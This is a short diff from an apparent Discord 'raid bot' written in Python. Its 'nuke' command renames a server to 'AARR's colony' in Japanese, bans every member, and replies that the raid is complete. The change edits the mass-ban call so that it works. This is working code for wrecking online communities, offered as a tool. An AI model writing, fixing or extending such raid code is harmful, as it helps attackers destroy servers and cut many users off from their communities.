@@ -17,7 +17,7 @@ async def nuke(ctx,guild: discord.Guild):
   await guild.edit(name="AARRの植民地")
   for user in guild.members:
     try:
-      await user.ban(reason="nuked by AARR Raid Bot")
+      await guild.ban(user, reason="raid")
     except:
       print("banできなかった")
   await ctx.reply(f"raid完了!")
